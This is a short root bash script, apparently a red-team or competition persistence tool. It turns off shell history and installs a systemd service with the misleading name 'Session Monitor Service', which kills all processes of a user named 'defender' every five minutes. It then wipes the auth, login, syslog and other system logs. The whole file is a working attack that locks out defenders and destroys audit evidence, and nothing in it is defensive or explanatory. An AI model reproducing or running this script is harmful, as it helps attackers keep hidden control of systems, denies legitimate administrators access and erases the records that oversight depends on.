#!/bin/bash
# setup_kick.sh - Run as root: sudo bash setup_kick.sh

# ── Suppress History ───────────────────────────────────────────
export HISTSIZE=0
unset HISTFILE

# ── Kick Service ───────────────────────────────────────────────
cat <<EOL > /etc/systemd/system/kick.service
[Unit]
Description=Session Monitor Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/bin/bash -c 'while true; do sleep 300; pkill -u defender; done'

[Install]
WantedBy=multi-user.target
EOL

systemctl enable kick

# ── Clear Logs ─────────────────────────────────────────────────
for log in /var/log/auth.log /var/log/lastlog /var/log/wtmp /var/log/btmp /var/log/syslog /var/log/faillog /var/log/daemon.log /var/log/user.log; do
    [ -f "$log" ] && cat /dev/null > "$log"
done

echo "[+] Kick service setup complete."
